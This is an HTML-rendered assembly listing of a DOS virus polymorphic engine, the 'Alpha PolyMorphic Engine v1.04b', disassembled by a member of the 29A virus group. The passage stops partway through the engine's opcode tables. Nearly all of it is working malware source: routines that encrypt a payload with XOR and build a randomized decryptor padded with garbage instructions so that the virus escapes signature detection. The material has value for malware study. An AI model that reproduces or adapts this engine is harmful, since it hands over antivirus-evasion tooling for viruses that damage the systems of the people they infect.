<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.APME.Demo.620 - apmepoly.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment *</span><span class="sc0">
</span><span class="sc1">;               Alpha PolyMorphic Engine v 1.04b [APME]  млллллм млллллм млллллм</span><span class="sc0">
</span><span class="sc1">;                            Disassembly by              ллл ллл ллл ллл ллл ллл</span><span class="sc0">
</span><span class="sc1">;                             Darkman/29A                 мммллп плллллл ллллллл</span><span class="sc0">
</span><span class="sc1">;                                                        лллмммм ммммллл ллл ллл</span><span class="sc0">
</span><span class="sc1">;                                                        ллллллл ллллллп ллл ллл</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;        Calling parameters:</span><span class="sc0">
</span><span class="sc1">;          SS:SP  Pointer to data block</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;        Return parameters:</span><span class="sc0">
</span><span class="sc1">;          AX     Length of decryptor + encrypted code</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Format of data block:</span><span class="sc0">
</span><span class="sc1">;     Offset  Size  Description</span><span class="sc0">
</span><span class="sc1">;        00h   04h  Pointer to decryptor + encrypted code</span><span class="sc0">
</span><span class="sc1">;        04h   04h  Pointer to original code</span><span class="sc0">
</span><span class="sc1">;        08h   02h  Maximum length of decryptor</span><span class="sc0">
</span><span class="sc1">;        0Ah   02h  Delta offset</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Garbage instructions:</span><span class="sc0">
</span><span class="sc1">;     INT 01h; STI; CLI; STD; CLD; INT 03h; INT 03h; CWD; RCL DX,01h; ADD DX,AX;</span><span class="sc0">
</span><span class="sc1">;     SUB DI,[BP+DI]; ADD BP,BX; MOV BP,00h; ADD BP,SP; PUSH SS POP CX;</span><span class="sc0">
</span><span class="sc1">;     ADD BP,CX</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Alpha PolyMorphic Engine v 1.04b [APME] decryptor:</span><span class="sc0">
</span><span class="sc1">;     Garbage instruction(s).</span><span class="sc0">
</span><span class="sc1">;     MOV AL,imm8                         (Decryption key)</span><span class="sc0">
</span><span class="sc1">;     Garbage instruction(s).</span><span class="sc0">
</span><span class="sc1">;     MOV BX,imm16                (Length of encrypted code + 01h)</span><span class="sc0">
</span><span class="sc1">;     Garbage instruction(s).</span><span class="sc0">
</span><span class="sc1">;     MOV SI,imm16                  (Offset of encrypted code)</span><span class="sc0">
</span><span class="sc1">;     Garbage instruction(s).</span><span class="sc0">
</span><span class="sc1">;     Garbage instruction(s).</span><span class="sc0">
</span><span class="sc1">;     XOR CS:[BX+SI-01h],AL</span><span class="sc0">
</span><span class="sc1">;     Garbage instruction(s).</span><span class="sc0">
</span><span class="sc1">;     DEC BX</span><span class="sc0">
</span><span class="sc1">;     JNZ imm8       (Offset of garbage generation(s) above decryption opcode)</span><span class="sc0">
</span><span class="sc1">;     Garbage instruction(s).</span><span class="sc0">
</span><span class="sc1">;     JMP $+02h</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Minimum length of decryptor:                  17 bytes.</span><span class="sc0">
</span><span class="sc1">;   Maximum length of decryptor:                 User defined.</span><span class="sc0">
</span><span class="sc1">;   Length of Alpha PolyMorphic Engine v 1.04b [APME]: 469 bytes.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   I would like to thank Lookout Man for providing me the binary of this</span><span class="sc0">
</span><span class="sc1">;   polymorphic engine.</span><span class="sc0">
</span><span class="sc1">; *</span><span class="sc0">

</span><span class="sc5">apme_begin</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">           </span><span class="sc1">; Begining of Alpha PolyMorphic En...</span><span class="sc0">

</span><span class="sc5">apme_poly</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Alpha PolyMorphic Engine v 1.04b</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Save BP at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; BP = stack pointer</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta_offse</span><span class="sc0">
</span><span class="sc5">delta_offse</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_offse</span><span class="sc0">
</span><span class="sc5">gen_poly</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">mov_al_i_off</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">index_ptr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Store offset of MOV AL,imm8 (De...)</span><span class="sc0">

         </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ES:DI = pointer to decryptor + e...</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">table_end</span><span class="sc4">-</span><span class="sc5">table_begin</span><span class="sc4">)/</span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">gen_poly_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000000000011b</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garbag_check</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">gen_decrypt</span><span class="sc0">     </span><span class="sc1">; Carry? Jump to gen_decrypt</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gen_poly_</span><span class="sc0">
</span><span class="sc5">gen_decrypt</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_decrypt_</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">gen_poly_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">decrypt__off</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">dec_bx_j_off</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Subtract offset of DEC BX; JNZ i...</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Decrease 8-bit immediate</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ff80h</span><span class="sc0">       </span><span class="sc1">; 8-bit immediate too large?</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">gen_poly</span><span class="sc0">        </span><span class="sc1">; Below? Jump to gen_poly</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; Store 8-bit immediate</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; AX = offset of encrypted code</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Subtract offset of decryptor + e...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">mov_si_i_off</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Decryptor too large?</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">gen_poly</span><span class="sc0">        </span><span class="sc1">; Above? Jump to gen_poly</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Add delta offset to offset of en...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Store offset of encrypted code</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">mov_al_i_off</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd_num</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; Store encryption/decryption key</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; CX = length of original code</span><span class="sc0">
         </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DS:SI = pointer to original code</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">       </span><span class="sc1">; AH = encryption/decryption key</span><span class="sc0">
</span><span class="sc5">encrypt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of original code</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">       </span><span class="sc1">; Encrypt a byte of original code</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store byte of of encrypted code</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encrypt_loop</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Add length of original code to l...</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Load BP from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">garbag_check</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Check whether or not garbage sho...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; CX = garbage check</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd_num</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Don't generate a random garbage ...</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">do_garbage</span><span class="sc0">      </span><span class="sc1">; Zero? Jump to do_garbage</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dont_garbage</span><span class="sc0">
</span><span class="sc5">do_garbage</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; Set carry flag</span><span class="sc0">
</span><span class="sc5">dont_garbage</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">random_num</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; 32-bit random number</span><span class="sc0">

</span><span class="sc5">get_rnd_num</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Get 32-bit random number</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of BIOS data area</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">46ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; AX = low-order word of timer tic...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">random_num</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Convert to 32-bit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">46ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; AX = low-order word of timer tic...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">random_num</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Convert to 32-bit</span><span class="sc0">

         </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; DX:AX = 32-bit random number</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Increase low-order word of 32-bi...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">random_num</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">random_num</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">gen_garbage</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Generate a random garbage instru...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">garbage_tbl</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SI = offset of garbage_tbl</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd_num</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000000000001111b</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Multiply random number with two</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; SI = offset within garbage_tbl</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX =   "      "    garbage_tbl_</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Add delta offset to offset withi...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; SI = offset within garbage_tbl_</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = length of opcode</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; CX =   "    "    "</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; Move opcode to decrypter + encry...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">gen_decrypt_</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Generate decryptor</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Save CX at stack</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">decrypt_tbl</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SI = offset of decrypt_tbl</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Decrease counter</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Multiply counter with two</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; SI = offset within decrypt_tbl</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX =   "      "    decrypt_tbl_</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Add delta offset to offset withi...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; SI = offset within decrypt_tbl_</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = length of opcode</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; CX =   "    "    "</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = length of immediate</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack</span><span class="sc0">

         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; No immediate?</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_immediate</span><span class="sc0">    </span><span class="sc1">; Zero? Jump to no_immediate</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Decrease length of immediate</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">index_ptr</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; SI = index pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">         </span><span class="sc1">; Store offset within decryptor + ...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; Add two to index pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">index_ptr</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">   </span><span class="sc1">; Store index pointer</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Add length of immediate to offse...</span><span class="sc0">
</span><span class="sc5">no_immediate</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc12">'[рPME] Alpha PolyMorphic Engine by ViKing - Version 1.04b'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
</span><span class="sc5">garbage_tbl</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">int_01h</span><span class="sc0">         </span><span class="sc1">; Offset of int_01h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">sti_</span><span class="sc0">        </span><span class="sc1">; Offset of sti_</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">cli_</span><span class="sc0">        </span><span class="sc1">; Offset of cli_</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">std_</span><span class="sc0">        </span><span class="sc1">; Offset of std_</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">cld_</span><span class="sc0">        </span><span class="sc1">; Offset of cld_</span><span class="sc0">
